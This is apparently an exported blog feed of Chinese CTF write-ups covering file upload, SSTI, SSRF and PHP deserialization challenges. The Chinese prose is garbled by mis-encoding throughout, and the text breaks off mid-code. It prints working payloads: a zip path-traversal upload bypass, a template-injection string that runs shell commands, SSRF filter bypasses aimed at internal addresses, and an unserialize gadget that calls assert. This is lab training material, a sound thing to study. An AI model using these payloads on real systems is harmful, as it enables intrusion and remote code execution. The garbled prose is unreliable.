<h1 id="ç¬¬äºŒç« -webè¿›é˜¶-æ–‡ä»¶ä¸Šä¼ "><a href="#ç¬¬äºŒç« -webè¿›é˜¶-æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="[ç¬¬äºŒç«  webè¿›é˜¶]æ–‡ä»¶ä¸Šä¼ "></a>[ç¬¬äºŒç«  webè¿›é˜¶]æ–‡ä»¶ä¸Šä¼ </h1><h2 id="çŸ¥è¯†ç‚¹ï¼š"><a href="#çŸ¥è¯†ç‚¹ï¼š" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h2><h3 id="1-apacheè‡ªå¸¦çš„æ–‡ä»¶è§£ææ¼æ´"><a href="#1-apacheè‡ªå¸¦çš„æ–‡ä»¶è§£ææ¼æ´" class="headerlink" title="1.apacheè‡ªå¸¦çš„æ–‡ä»¶è§£ææ¼æ´"></a>1.apacheè‡ªå¸¦çš„æ–‡ä»¶è§£ææ¼æ´</h3><p>å¦‚æœapacheè¯»å–æ–‡ä»¶çš„æ—¶å€™ï¼Œåç¼€ä¸ºå…¶ä¸å¯è§£æçš„æ–‡ä»¶ååç¼€ï¼Œå°±ä¼šå‘ä¸Šè¿½æº¯ï¼Œä¾‹å¦‚æˆ‘ä»¬çš„apacheè§£æ</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">aaa.php.xxx</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºapacheæ— æ³•è§£æxxx,æ‰€ä»¥apacheå°±ä¼šè§£æå‰ä¸€ä¸ªï¼Œå°±æ˜¯aaa.phpäº†ã€ä½†æ˜¯æˆ‘ä»¬è®¿é—®çš„æ—¶å€™ä¾ç„¶ç”¨aaa.php.xxxå»è®¿é—®</p>
<h3 id="2-é€»è¾‘æ¼æ´"><a href="#2-é€»è¾‘æ¼æ´" class="headerlink" title="2.é€»è¾‘æ¼æ´"></a>2.é€»è¾‘æ¼æ´</h3><p>é¢˜ç›®æ˜¯ç»™å‡ºæºä»£ç çš„ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="comment">// æ¯5åˆ†é’Ÿä¼šæ¸…é™¤ä¸€æ¬¡ç›®å½•ä¸‹ä¸Šä¼ çš„æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;pclzip.lib.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_FILES)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;zh&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;æ–‡ä»¶ä¸Šä¼ ç« èŠ‚ç»ƒä¹ é¢˜&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css&quot; integrity=&quot;sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u&quot; crossorigin=&quot;anonymous&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;style type=&quot;text/css&quot;&gt;</span></span><br><span class="line"><span class="string">        .login-box&#123;</span></span><br><span class="line"><span class="string">            margin-top: 100px;</span></span><br><span class="line"><span class="string">            height: 500px;</span></span><br><span class="line"><span class="string">            border: 1px solid #000;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        body&#123;</span></span><br><span class="line"><span class="string">            background: white;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        .btn1&#123;</span></span><br><span class="line"><span class="string">            width: 200px;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        .d1&#123;</span></span><br><span class="line"><span class="string">            display: block;</span></span><br><span class="line"><span class="string">            height: 400px;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;login-box col-md-12&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;form class=&quot;form-horizontal&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; &gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;æ–‡ä»¶ä¸Šä¼ ç« èŠ‚ç»ƒä¹ é¢˜&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;hr /&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;form-group&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;label class=&quot;col-sm-2 control-label&quot;&gt;é€‰æ‹©æ–‡ä»¶ï¼š&lt;/label&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;input-group col-sm-10&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div &gt;</span></span><br><span class="line"><span class="string">                    &lt;label for=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;/label&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">        &lt;div class=&quot;col-sm-8  text-right&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; class=&quot;btn btn-success text-right btn1&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $file = $_FILES[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!$file)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;è¯·å‹¿ä¸Šä¼ ç©ºæ–‡ä»¶&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $name = $file[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    $dir = <span class="string">&#x27;upload/&#x27;</span>;</span><br><span class="line">    $ext = strtolower(substr(strrchr($name, <span class="string">&#x27;.&#x27;</span>), <span class="number">1</span>));</span><br><span class="line">    $path = $dir.$name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check_dir</span>(<span class="params">$dir</span>)</span>&#123;</span><br><span class="line">        $handle = opendir($dir);</span><br><span class="line">        <span class="keyword">while</span>(($f = readdir($handle)) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!in_array($f, <span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;..&#x27;</span>)))&#123;</span><br><span class="line">                <span class="keyword">if</span>(is_dir($dir.$f))&#123;</span><br><span class="line">                    check_dir($dir.$f.<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">                 &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    $ext = strtolower(substr(strrchr($f, <span class="string">&#x27;.&#x27;</span>), <span class="number">1</span>));</span><br><span class="line">                    <span class="keyword">if</span>(!in_array($ext, <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>)))&#123;</span><br><span class="line">                        unlink($dir.$f);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!is_dir($dir))&#123;</span><br><span class="line">        mkdir($dir);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $temp_dir = $dir.md5(time(). rand(<span class="number">1000</span>,<span class="number">9999</span>));</span><br><span class="line">    <span class="keyword">if</span>(!is_dir($temp_dir))&#123;</span><br><span class="line">        mkdir($temp_dir);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(in_array($ext, <span class="keyword">array</span>(<span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>)))&#123;</span><br><span class="line">        <span class="keyword">if</span>($ext == <span class="string">&#x27;zip&#x27;</span>)&#123;</span><br><span class="line">            $archive = <span class="keyword">new</span> PclZip($file[<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">            <span class="keyword">foreach</span>($archive-&gt;listContent() <span class="keyword">as</span> $value)&#123;</span><br><span class="line">                $filename = $value[<span class="string">&quot;filename&quot;</span>];</span><br><span class="line">                <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\.php$/&#x27;</span>, $filename))&#123;</span><br><span class="line">                     <span class="keyword">exit</span>(<span class="string">&quot;å‹ç¼©åŒ…å†…ä¸å…è®¸å«æœ‰phpæ–‡ä»¶!&quot;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($archive-&gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == <span class="number">0</span>) &#123;</span><br><span class="line">                check_dir($dir);</span><br><span class="line">                   <span class="keyword">exit</span>(<span class="string">&quot;è§£å‹å¤±è´¥&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            check_dir($dir);</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;ä¸Šä¼ æˆåŠŸ!&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            move_uploaded_file($file[<span class="string">&#x27;tmp_name&#x27;</span>], $temp_dir.<span class="string">&#x27;/&#x27;</span>.$file[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">            check_dir($dir);</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;ä¸Šä¼ æˆåŠŸ!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;ä»…å…è®¸ä¸Šä¼ zipã€jpgã€gifã€pngæ–‡ä»¶!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ ¸å¿ƒçš„ç‚¹åœ¨check_dirè¿™é‡Œï¼Œæˆ‘ä»¬ä¸Šä¸‹çœ‹ä¸€çœ¼å°±çŸ¥é“æˆ‘ä»¬æ˜¯ç™½åå•ä¸Šä¼ ï¼Œç»•è¿‡å°±åˆ«æƒ³äº†ï¼Œä½†æ˜¯ä»–å…è®¸æˆ‘ä»¬ä¸Šä¼ zipï¼Œè¿™æ ·çš„è¯å°±æœ‰æ“ä½œçš„ç©ºé—´äº†ã€‚æ³¨æ„è¿™ä¸ªå‡½æ•°ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$archive = <span class="keyword">new</span> PclZip($file[<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ¶‰åŠåˆ°äº†ä¸€ä¸ªtrickï¼Œè¯¥å‡½æ•°æ˜¯å­˜åœ¨ç›®å½•ç©¿è¶Šæ¼æ´çš„ï¼ã€‚ä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬çš„æ–‡ä»¶åä¸º../../xx.php.xx</p>
<p><strong>å°±ä¼šè¢«ä¸Šä¼ åˆ°å…¶ä»–ç›®å½•</strong>ï¼Œè¿™é‡Œä¿®æ”¹çš„è¯éœ€è¦åˆ©ç”¨010editoræ¥è¿›è¡Œæ“ä½œ</p>
<p>ä¹‹åæˆ‘ä»¬å¯ä»¥çœ‹è§ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($archive-&gt;listContent() <span class="keyword">as</span> $value)&#123;</span><br><span class="line">                $filename = $value[<span class="string">&quot;filename&quot;</span>];</span><br><span class="line">                <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\.php$/&#x27;</span>, $filename))&#123;</span><br><span class="line">                     <span class="keyword">exit</span>(<span class="string">&quot;å‹ç¼©åŒ…å†…ä¸å…è®¸å«æœ‰phpæ–‡ä»¶!&quot;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>é€»è¾‘æ˜¯å…ˆè§£å‹æ–‡ä»¶ï¼Œä¹‹åå†checkï¼Œä½†æ˜¯åˆ©ç”¨è¯¥æ¼æ´ï¼Œcheckçš„æ—¶å€™æ–‡ä»¶å·²ç»è¢«åˆ›å»ºåˆ°å…¶ä»–æ–‡ä»¶å¤¹å»äº†ï¼Œä¹Ÿå°±æ²¡åŠæ³•checkåˆ°äº†ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬è¿™é‡Œç›´æ¥ä¸Šä¼ ä¸€ä¸ª../../xx.php.xxxå°±è¡Œäº†</p>
<h1 id="ç¬¬ä¸‰ç« -webè¿›é˜¶-SSTI"><a href="#ç¬¬ä¸‰ç« -webè¿›é˜¶-SSTI" class="headerlink" title="[ç¬¬ä¸‰ç«  webè¿›é˜¶]SSTI"></a>[ç¬¬ä¸‰ç«  webè¿›é˜¶]SSTI</h1><p>ç®€å•é¢˜ç›®ï¼Œç›´æ¥æ¢­å°±è¡Œäº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;5d5ec153-1957-45a2-bff1-fda588f70774.node3.buuoj.cn&#x2F;?password&#x3D;&#123;&#123; config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat app&#x2F;server.py&#39;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬ä¸‰ç« -webè¿›é˜¶-Pythoné‡Œçš„SSRF"><a href="#ç¬¬ä¸‰ç« -webè¿›é˜¶-Pythoné‡Œçš„SSRF" class="headerlink" title="[ç¬¬ä¸‰ç«  webè¿›é˜¶]Pythoné‡Œçš„SSRF"></a>[ç¬¬ä¸‰ç«  webè¿›é˜¶]Pythoné‡Œçš„SSRF</h1><p>çŸ¥è¯†ç‚¹ï¼š</p>
<p>å…³äºSSRFï¼Œå…¶å®æˆ‘ä¹Ÿæ‡‚å¾—ä¸å¤š..è¿™é“é¢˜é¢˜ç›®ç»™å‡ºæç¤ºè®©æˆ‘ä»¬è®¿é—®</p>
<p>8000 ç«¯å£å’Œ url path /api/internal/secret</p>
<p>è¿™é‡Œæ˜¯çœ‹è¿‡Pç‰›çš„æ–‡ç« ..</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">leavesongs.com&#x2F;PYTHON&#x2F;defend-ssrf-vulnerable-in-python.html</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥æˆ‘ä»¬æƒ³è¦ç»•è¿‡åªéœ€è¦æ„é€ ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;95cf0d10-668e-49cc-a0ac-3982c091dd6d.node3.buuoj.cn&#x2F;?url&#x3D;http:&#x2F;&#x2F;127.233.233.233:8000&#x2F;api&#x2F;internal&#x2F;secret</span><br></pre></td></tr></table></figure>

<p>é™¤æ­¤ä¹‹å¤–ï¼Œåœ¨linuxå½“ä¸­0.0.0.0ç­‰æ•ˆäº127.0.0.1</p>
<p>æ•…æˆ‘ä»¬å…¶å®ä¹Ÿå¯ä»¥æ„é€ ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;95cf0d10-668e-49cc-a0ac-3982c091dd6d.node3.buuoj.cn&#x2F;?url&#x3D;http:&#x2F;&#x2F;0.0.0.0:8000&#x2F;api&#x2F;internal&#x2F;secret</span><br></pre></td></tr></table></figure>

<p>è¿˜æœ‰ï¼š</p>
<ol>
<li>åˆ©ç”¨å…«è¿›åˆ¶IPåœ°å€ç»•è¿‡</li>
<li>åˆ©ç”¨åå…­è¿›åˆ¶IPåœ°å€ç»•è¿‡</li>
<li>åˆ©ç”¨åè¿›åˆ¶çš„IPåœ°å€ç»•è¿‡</li>
<li>åˆ©ç”¨IPåœ°å€çš„çœç•¥å†™æ³•ç»•è¿‡</li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">å››ç§å†™æ³•ï¼ˆ5ä¸ªä¾‹å­ï¼‰ï¼š012.0.0.1 ã€ 0xa.0.0.1 ã€ 167772161 ã€ 10.1 ã€ 0xA000001 å®é™…ä¸Šéƒ½è¯·æ±‚çš„æ˜¯10.0.0.1ï¼Œä½†ä»–ä»¬ä¸€ä¸ªéƒ½åŒ¹é…ä¸ä¸Šä¸Šè¿°æ­£åˆ™è¡¨è¾¾å¼ã€‚</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¿˜æä¾›ä¸€äº›ssrfçš„æ€è·¯ï¼Œæ¯”å¦‚ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">http://233.233.233.233@10.0.0.1:8080/ã€http://10.0.0.1#233.233.233.233è¿™æ ·çš„URLï¼Œè®©åç«¯è®¤ä¸ºå…¶Hostæ˜¯233.233.233.233ï¼Œå®é™…ä¸Šè¯·æ±‚çš„å´æ˜¯10.0.0.1ã€‚è¿™ç§æ–¹æ³•åˆ©ç”¨çš„æ˜¯ç¨‹åºå‘˜å¯¹URLè§£æçš„é”™è¯¯</span><br></pre></td></tr></table></figure>

<p>è¿˜æœ‰è¿™ä¹ˆä¸€ä¸ª[xipæœåŠ¡] <a href="http://xip.io/">http://xip.io</a></p>
<p>æš‚ä¸”æ€è€ƒåˆ°è¿™é‡Œï¼š</p>
<h1 id="ç¬¬äºŒç« -webè¿›é˜¶-SSRF-Training"><a href="#ç¬¬äºŒç« -webè¿›é˜¶-SSRF-Training" class="headerlink" title="[ç¬¬äºŒç«  webè¿›é˜¶]SSRF Training"></a>[ç¬¬äºŒç«  webè¿›é˜¶]SSRF Training</h1><p>å‘ƒï¼Œå°±å¾ˆå¥‡æ€ªï¼Ÿè¿™é“é¢˜çš„æ—¶å€™ï¼Œindex.phpæœåŠ¡ä¸‹çš„å®¹å™¨ï¼Œå¯ä»¥ç›´æ¥127.0.0.1/flag.phpå°±å†²è¿‡å»äº†</p>
<p><img src="image-20201204151421793.png" alt="image-20201204151421793"></p>
<p>ä½†æ˜¯è¿˜æœ‰ä¸ªchallenge.php,è¿™ä¸ªè¦éš¾ã€‚ç»™å‡ºæºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params">$url</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $match_result=preg_match(<span class="string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,$url);</span><br><span class="line">    <span class="keyword">if</span> (!$match_result)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        $url_parse=parse_url($url);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> $e)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $hostname=$url_parse[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    $ip=gethostbyname($hostname);</span><br><span class="line">    $int_ip=ip2long($ip);</span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == $int_ip&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == $int_ip&gt;&gt;<span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params">$url</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip($url))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> $url.<span class="string">&#x27; is inner ip&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $result_info = curl_getinfo($ch);</span><br><span class="line">        <span class="keyword">if</span> ($result_info[<span class="string">&#x27;redirect_url&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            safe_request_url($result_info[<span class="string">&#x27;redirect_url&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        var_dump($output);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($url))&#123;</span><br><span class="line">    safe_request_url($url);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸»è¦trickåœ¨äºparse_urlå’Œcurlçš„è§£æä¼šå‡ºç°å·®å¼‚ï¼Œå½“æˆ‘ä»¬æ„é€ urlä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;a@127.0.0.1:80@baidu.com</span><br></pre></td></tr></table></figure>

<p>parse_urlä¼šè§£æåè€…ï¼Œæ‹¿åˆ°æ‰‹ä¸Šçš„å°±æ˜¯<a href="http://baidu.com,è€Œcurlå®é™…ä¸Šå‘é€å‡ºå»çš„è¯·æ±‚ä¸º127.0.0.1/">http://baidu.com,è€Œcurlå®é™…ä¸Šå‘é€å‡ºå»çš„è¯·æ±‚ä¸º127.0.0.1:80</a></p>
<p>æ³¨æ„ä¸€äº›ï¼Œå¦‚æœä½ éœ€è¦è®¿é—®æŸä¸ªé¡µé¢ï¼Œä½ éœ€è¦æ·»åŠ çš„payloadåº”è¯¥æ˜¯ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">?url=http://a@127.0.0.1:80@hacktest.com/flag.php</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>NPUCTF2020</title>
    <url>/2020/10/30/NPUCTF2020/</url>
    <content><![CDATA[<h1 id="webğŸ•"><a href="#webğŸ•" class="headerlink" title="webğŸ•"></a>webğŸ•</h1><p>åˆ—è¡¨å†…å®¹å¤åˆ¶ç²˜è´´ï¼Œä¸¢pythoné‡Œé¢è·‘ä¸€è½®å°±è¡Œäº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">54</span>, <span class="number">95</span>, <span class="number">52</span>, <span class="number">111</span>, <span class="number">103</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">101</span>, <span class="number">52</span>, <span class="number">115</span>, <span class="number">121</span>, <span class="number">103</span>, <span class="number">48</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">125</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    print(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>å•Šï¼Œåˆ«çœ‹äº†ï¼Œè¿™ä¸Šé¢å¤ªä¸¢äººäº†ã€‚ã€‚ã€‚åŸæ¥æ˜¯å› ä¸ºè¿™æ˜¯æœ€åä¸€æ­¥ï¼Œ</p>
<h1 id="ReadlezPHP"><a href="#ReadlezPHP" class="headerlink" title="ReadlezPHP"></a>ReadlezPHP</h1><p>è¿™é“é¢˜ç›®å’Œä¹‹å‰åœ¨ç½‘é¼æ¯åšçš„phpwebå¾ˆåƒï¼Œä¸€æ ·çš„æ˜¯è¿›è¡ŒåŠ¨è°ƒï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure>

<p>flagè¯´æ˜¯åœ¨phpinfoå½“ä¸­,æ„é€ å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span 